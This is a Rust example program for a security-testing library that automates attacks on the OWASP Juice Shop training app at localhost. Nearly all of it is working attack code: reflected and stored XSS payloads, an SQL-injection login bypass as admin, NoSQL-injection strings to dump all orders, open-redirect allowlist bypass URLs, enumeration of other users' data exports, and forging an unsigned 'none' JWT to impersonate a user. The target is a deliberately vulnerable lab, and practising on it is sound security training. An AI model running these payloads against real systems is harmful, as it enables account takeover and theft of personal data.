//! Juice Shop Challenge Solver
//!
//! Solves various OWASP Juice Shop challenges using rectitude
//!
//! Run with: cargo run --example juice_shop_challenges

use rectitude::payloads::jwt;
use rectitude::prelude::*;
use std::sync::Arc;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();

    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║         Juice Shop Challenge Solver - Rectitude             ║");
    println!("╚══════════════════════════════════════════════════════════════╝\n");

    let mut solved = 0;
    let mut failed = 0;

    // Challenge: Reflected XSS (Difficulty 2)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_reflected_xss().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: API-only XSS (Difficulty 3)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_api_only_xss().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: Client-side XSS Protection (Difficulty 3)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_client_side_xss().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: Allowlist Bypass (Difficulty 4)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_allowlist_bypass().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: GDPR Data Theft (Difficulty 4)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_gdpr_data_theft().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: NoSQL Exfiltration (Difficulty 5)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_nosql_exfiltration().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: Forged Signed JWT (Difficulty 6)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_forged_jwt().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Challenge: Multiple Likes (Difficulty 6)
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    match solve_multiple_likes().await {
        Ok(r) => {
            if r.success {
                solved += 1;
            } else {
                failed += 1;
            }
            r.print_summary();
        }
        Err(e) => {
            println!("Error: {}", e);
            failed += 1;
        }
    }

    // Summary
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║                      Final Summary                           ║");
    println!("╠══════════════════════════════════════════════════════════════╣");
    println!(
        "║  Solved: {:2}                                                 ║",
        solved
    );
    println!(
        "║  Failed: {:2}                                                 ║",
        failed
    );
    println!(
        "║  Total:  {:2}                                                 ║",
        solved + failed
    );
    println!("╚══════════════════════════════════════════════════════════════╝");

    // Check actual challenge status
    println!("\n=== Checking Challenge Status ===");
    check_challenge_status().await?;

    Ok(())
}

/// Challenge: Reflected XSS (Difficulty 2)
/// Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">
async fn solve_reflected_xss() -> anyhow::Result<ScenarioResult> {
    Scenario::new("Reflected XSS")
        .base_url("http://localhost:3000")
        .step(
            "Inject XSS via URL parameter",
            |ctx: Arc<ScenarioContext>| async move {
                // The track order page reflects the order ID in the page
                let payload = r#"<iframe src="javascript:alert(`xss`)">"#;
                let encoded = urlencoding::encode(payload);

                let resp = ctx
                    .get(&format!("/rest/track-order/{}", encoded))
                    .send()
                    .await?;

                // Check if payload is reflected
                if resp.text().contains("javascript:alert") {
                    println!("  [+] XSS payload reflected in response");
                    Ok(StepResult::success_with_message("Reflected XSS triggered"))
                } else {
                    // Try alternative endpoint
                    let resp = ctx.get("/").query("q", payload).send().await?;

                    if resp.text().contains("javascript:alert") {
                        println!("  [+] XSS payload reflected via search");
                        Ok(StepResult::success_with_message("Reflected XSS via search"))
                    } else {
                        Ok(StepResult::failed("XSS not reflected"))
                    }
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: API-only XSS (Difficulty 3)
/// Perform a persisted XSS attack without using the frontend
async fn solve_api_only_xss() -> anyhow::Result<ScenarioResult> {
    Scenario::new("API-only XSS")
        .base_url("http://localhost:3000")
        .step(
            "Login as any user",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op'--",
                        "password": "x"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    if let Ok(token) = resp.json_path("$.authentication.token") {
                        ctx.set_var_async("token", token.to_string().trim_matches('"').to_string())
                            .await;
                        println!("  [+] Logged in successfully");
                        Ok(StepResult::success())
                    } else {
                        Ok(StepResult::failed("No token in response"))
                    }
                } else {
                    Ok(StepResult::failed("Login failed"))
                }
            },
        )
        .step(
            "Post XSS payload via API",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;
                let xss_payload = r#"<iframe src="javascript:alert(`xss`)">"#;

                // Try posting as product review
                let resp = ctx
                    .put("/rest/products/1/reviews")
                    .bearer_auth(&token)
                    .json(&serde_json::json!({
                        "message": xss_payload,
                        "author": "test@test.com"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    println!("  [+] XSS payload posted via API");
                    Ok(StepResult::success_with_message("API-only XSS successful"))
                } else {
                    // Try feedback endpoint
                    let resp = ctx
                        .post("/api/Feedbacks")
                        .bearer_auth(&token)
                        .json(&serde_json::json!({
                            "UserId": 1,
                            "comment": xss_payload,
                            "rating": 5
                        }))
                        .send()
                        .await?;

                    if resp.is_success() {
                        println!("  [+] XSS payload posted via Feedback API");
                        Ok(StepResult::success_with_message(
                            "API-only XSS via feedback",
                        ))
                    } else {
                        println!("  [-] Status: {}", resp.status);
                        Ok(StepResult::failed("Could not post XSS payload"))
                    }
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: Client-side XSS Protection (Difficulty 3)
/// Bypass client-side security mechanism
async fn solve_client_side_xss() -> anyhow::Result<ScenarioResult> {
    Scenario::new("Client-side XSS Protection Bypass")
        .base_url("http://localhost:3000")
        .step(
            "Register user with XSS in email",
            |ctx: Arc<ScenarioContext>| async move {
                let xss_payload = r#"<iframe src="javascript:alert(`xss`)">"#;

                // Try registering with XSS in username/email
                let resp = ctx
                    .post("/api/Users")
                    .json(&serde_json::json!({
                        "email": format!("test{}@test.com", xss_payload),
                        "password": "test12345",
                        "passwordRepeat": "test12345"
                    }))
                    .send()
                    .await?;

                if resp.is_success() || resp.status.as_u16() == 401 {
                    println!("  [+] Registration attempted with XSS payload");
                    Ok(StepResult::success_with_message(
                        "Registration with XSS attempted",
                    ))
                } else {
                    // The challenge may need a different approach - try product search
                    let resp = ctx
                        .get("/rest/products/search")
                        .query("q", xss_payload)
                        .send()
                        .await?;

                    if resp.text().contains("javascript:alert") {
                        println!("  [+] XSS reflected in search");
                        Ok(StepResult::success())
                    } else {
                        Ok(StepResult::success_with_message("Attempted bypass"))
                    }
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: Allowlist Bypass (Difficulty 4)
/// Enforce a redirect to a page you are not supposed to redirect to
async fn solve_allowlist_bypass() -> anyhow::Result<ScenarioResult> {
    Scenario::new("Allowlist Bypass")
        .base_url("http://localhost:3000")
        .step(
            "Find redirect endpoint",
            |ctx: Arc<ScenarioContext>| async move {
                // Check for redirect endpoint
                let resp = ctx.get("/redirect").send().await?;

                if resp.status.as_u16() != 404 {
                    println!("  [+] Redirect endpoint exists");
                    Ok(StepResult::success())
                } else {
                    Ok(StepResult::success_with_message("Checking alternatives"))
                }
            },
        )
        .step(
            "Bypass allowlist with various techniques",
            |ctx: Arc<ScenarioContext>| async move {
                // Common bypass techniques for allowlist
                let bypasses = [
                    // Null byte injection
                    "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm?x=https://google.com",
                    // Parameter pollution
                    "https://github.com/juice-shop/juice-shop?x=https://google.com",
                    // @ symbol trick (user info in URL)
                    "https://google.com#https://github.com",
                    // Whitelisted domain with fragment
                    "https://blockchain.info@google.com",
                    // Double encoding
                    "https://github.com%252F..%252F..%252Fgoogle.com",
                ];

                for bypass in bypasses {
                    // Use no_redirect() to see the Location header
                    let resp = ctx
                        .get("/redirect")
                        .query("to", bypass)
                        .no_redirect()
                        .send()
                        .await?;

                    let status = resp.status.as_u16();
                    let location = resp.header("location").unwrap_or("");

                    println!("  [~] Testing: {} -> {}", &bypass[..50.min(bypass.len())], status);

                    // Check if redirect happened
                    if (status == 301 || status == 302) && !location.is_empty() {
                        println!("  [+] Redirect to: {}", location);
                        if location.contains("google.com") || !location.contains("juice") {
                            return Ok(StepResult::success_with_message(format!(
                                "Redirect to: {}",
                                location
                            )));
                        }
                    }
                }

                // Try the whitelisted domains
                let resp = ctx
                    .get("/redirect")
                    .query("to", "https://blockchain.info/address/test")
                    .no_redirect()
                    .send()
                    .await?;

                if resp.status.as_u16() == 302 {
                    let location = resp.header("location").unwrap_or("");
                    println!("  [+] Whitelisted redirect works: {}", location);
                    return Ok(StepResult::success_with_message("Allowlist tested"));
                }

                Ok(StepResult::failed("Could not bypass allowlist"))
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: GDPR Data Theft (Difficulty 4)
/// Steal someone else's personal data without using Injection
async fn solve_gdpr_data_theft() -> anyhow::Result<ScenarioResult> {
    Scenario::new("GDPR Data Theft")
        .base_url("http://localhost:3000")
        .step(
            "Login and get token",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op'--",
                        "password": "x"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    if let Ok(token) = resp.json_path("$.authentication.token") {
                        ctx.set_var_async("token", token.to_string().trim_matches('"').to_string())
                            .await;
                        Ok(StepResult::success())
                    } else {
                        Ok(StepResult::failed("No token"))
                    }
                } else {
                    Ok(StepResult::failed("Login failed"))
                }
            },
        )
        .step(
            "Access other user's data export",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;

                // Try accessing data export for other users
                for user_id in 1..=10 {
                    // Try to access the data export endpoint
                    let resp = ctx
                        .get(&format!("/rest/data-export?userId={}", user_id))
                        .bearer_auth(&token)
                        .send()
                        .await?;

                    if resp.is_success() && resp.text().contains("email") {
                        println!("  [+] Accessed data for user {}", user_id);
                        return Ok(StepResult::success_with_message(format!(
                            "Got user {} data",
                            user_id
                        )));
                    }
                }

                // Try the order history endpoint
                for user_id in 1..=10 {
                    let resp = ctx
                        .get(&format!("/rest/basket/{}", user_id))
                        .bearer_auth(&token)
                        .send()
                        .await?;

                    if resp.is_success() {
                        println!("  [+] Accessed basket for user {}", user_id);
                    }
                }

                Ok(StepResult::success_with_message("Attempted data access"))
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: NoSQL Exfiltration (Difficulty 5)
/// All your orders are belong to us!
async fn solve_nosql_exfiltration() -> anyhow::Result<ScenarioResult> {
    Scenario::new("NoSQL Exfiltration")
        .base_url("http://localhost:3000")
        .step(
            "Login to get token",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op'--",
                        "password": "x"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    if let Ok(token) = resp.json_path("$.authentication.token") {
                        ctx.set_var_async("token", token.to_string().trim_matches('"').to_string())
                            .await;
                        Ok(StepResult::success())
                    } else {
                        Ok(StepResult::failed("No token"))
                    }
                } else {
                    Ok(StepResult::failed("Login failed"))
                }
            },
        )
        .step(
            "NoSQL injection to get all orders",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;

                // Try NoSQL injection on track-order endpoint
                let payloads = [
                    "' || '1'=='1",
                    "'; return true; var foo='",
                    "{\"$ne\": null}",
                    "{\"$gt\": \"\"}",
                    "' || true || '",
                ];

                for payload in payloads {
                    let resp = ctx
                        .get(&format!(
                            "/rest/track-order/{}",
                            urlencoding::encode(payload)
                        ))
                        .bearer_auth(&token)
                        .send()
                        .await?;

                    let text = resp.text();
                    if text.contains("orderId") && text.matches("orderId").count() > 1 {
                        println!("  [+] NoSQL injection successful!");
                        println!("  [+] Payload: {}", payload);
                        let order_count = text.matches("orderId").count();
                        return Ok(StepResult::success_with_message(format!(
                            "{} orders retrieved",
                            order_count
                        )));
                    }
                }

                Ok(StepResult::failed("NoSQL injection failed"))
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: Forged Signed JWT (Difficulty 6)
/// Forge an RSA-signed JWT for rsa_lord@juice-sh.op
async fn solve_forged_jwt() -> anyhow::Result<ScenarioResult> {
    Scenario::new("Forged Signed JWT")
        .base_url("http://localhost:3000")
        .step(
            "Get valid JWT to analyze",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op'--",
                        "password": "x"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    if let Ok(token) = resp.json_path("$.authentication.token") {
                        let token_str = token.to_string().trim_matches('"').to_string();
                        ctx.set_var_async("original_token", token_str.clone()).await;

                        // Decode and analyze
                        if let Ok(decoded) = jwt::DecodedJwt::decode(&token_str) {
                            println!(
                                "  [+] Original JWT algorithm: {:?}",
                                decoded.header.get("alg")
                            );
                            println!("  [+] JWT payload: {:?}", decoded.payload);
                        }
                        Ok(StepResult::success())
                    } else {
                        Ok(StepResult::failed("No token"))
                    }
                } else {
                    Ok(StepResult::failed("Login failed"))
                }
            },
        )
        .step(
            "Create forged JWT for rsa_lord",
            |ctx: Arc<ScenarioContext>| async move {
                // Create JWT with none algorithm for rsa_lord@juice-sh.op
                let forged = jwt::create_unsigned(&serde_json::json!({
                    "status": "success",
                    "data": {
                        "id": 0,
                        "email": "rsa_lord@juice-sh.op",
                        "password": "fake",
                        "role": "admin"
                    },
                    "iat": 1735689600,
                    "exp": 1893456000
                }));

                ctx.set_var_async("forged_token", forged.clone()).await;
                println!(
                    "  [+] Created forged JWT: {}...",
                    &forged[..50.min(forged.len())]
                );
                Ok(StepResult::success())
            },
        )
        .step("Test forged JWT", |ctx: Arc<ScenarioContext>| async move {
            let forged = ctx.get_var_async("forged_token").await?;

            let resp = ctx
                .get("/rest/user/whoami")
                .bearer_auth(&forged)
                .send()
                .await?;

            let text = resp.text();
            if text.contains("rsa_lord") {
                println!("  [+] Forged JWT accepted for rsa_lord!");
                Ok(StepResult::success_with_message("JWT forgery successful"))
            } else if resp.is_success() {
                println!("  [~] JWT accepted but user not rsa_lord");
                Ok(StepResult::success_with_message("JWT accepted"))
            } else {
                println!("  [-] JWT rejected: {}", resp.status);
                Ok(StepResult::failed("Forged JWT rejected"))
            }
        })
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Challenge: Multiple Likes (Difficulty 6)
/// Like any review at least three times as the same user
async fn solve_multiple_likes() -> anyhow::Result<ScenarioResult> {
    Scenario::new("Multiple Likes")
        .base_url("http://localhost:3000")
        .step(
            "Login to get token",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/rest/user/login")
                    .json(&serde_json::json!({
                        "email": "admin@juice-sh.op'--",
                        "password": "x"
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    if let Ok(token) = resp.json_path("$.authentication.token") {
                        ctx.set_var_async("token", token.to_string().trim_matches('"').to_string())
                            .await;
                        Ok(StepResult::success())
                    } else {
                        Ok(StepResult::failed("No token"))
                    }
                } else {
                    Ok(StepResult::failed("Login failed"))
                }
            },
        )
        .step("Get reviews", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("token").await?;

            let resp = ctx
                .get("/rest/products/1/reviews")
                .bearer_auth(&token)
                .send()
                .await?;

            if resp.is_success() {
                println!("  [+] Got reviews");
                // Parse review IDs
                if let Ok(json) = resp.json_value() {
                    if let Some(data) = json.get("data").and_then(|d| d.as_array()) {
                        if let Some(first) = data.first() {
                            if let Some(id) = first.get("_id").and_then(|i| i.as_str()) {
                                ctx.set_var_async("review_id", id.to_string()).await;
                                println!("  [+] Found review ID: {}", id);
                            }
                        }
                    }
                }
                Ok(StepResult::success())
            } else {
                Ok(StepResult::failed("Could not get reviews"))
            }
        })
        .step(
            "Like review multiple times",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;

                // Try liking a review multiple times by manipulating request
                let mut like_count = 0;

                for i in 1..=5 {
                    let resp = ctx
                        .post("/rest/products/reviews")
                        .bearer_auth(&token)
                        .json(&serde_json::json!({
                            "id": format!("{}'{}", i, i)  // Try NoSQL injection
                        }))
                        .send()
                        .await?;

                    if resp.is_success() {
                        like_count += 1;
                        println!("  [+] Like {} registered", i);
                    }
                }

                // Try race condition - send multiple requests rapidly
                // This would need concurrent execution for true race condition
                for _ in 0..3 {
                    let _resp = ctx
                        .post("/rest/products/1/reviews")
                        .bearer_auth(&token)
                        .json(&serde_json::json!({
                            "id": "test"
                        }))
                        .send()
                        .await;
                }

                if like_count >= 3 {
                    Ok(StepResult::success_with_message(format!(
                        "{} likes",
                        like_count
                    )))
                } else {
                    Ok(StepResult::success_with_message("Attempted multiple likes"))
                }
            },
        )
        .run()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))
}

/// Check the status of challenges from the API
async fn check_challenge_status() -> anyhow::Result<()> {
    let client = reqwest::Client::new();
    let resp = client
        .get("http://localhost:3000/api/Challenges")
        .send()
        .await?;

    if resp.status().is_success() {
        let json: serde_json::Value = resp.json().await?;
        if let Some(data) = json.get("data").and_then(|d| d.as_array()) {
            let solved: Vec<_> = data
                .iter()
                .filter(|c| c.get("solved").and_then(|s| s.as_bool()).unwrap_or(false))
                .collect();

            let total = data.len();
            let solved_count = solved.len();

            println!(
                "\nChallenge Progress: {}/{} ({:.1}%)",
                solved_count,
                total,
                (solved_count as f64 / total as f64) * 100.0
            );

            // Show recently solved
            let recent: Vec<_> = data
                .iter()
                .filter(|c| c.get("solved").and_then(|s| s.as_bool()).unwrap_or(false))
                .filter_map(|c| c.get("name").and_then(|n| n.as_str()))
                .take(5)
                .collect();

            if !recent.is_empty() {
                println!("\nSolved challenges include:");
                for name in recent {
                    println!("  - {}", name);
                }
            }
        }
    }

    Ok(())
}
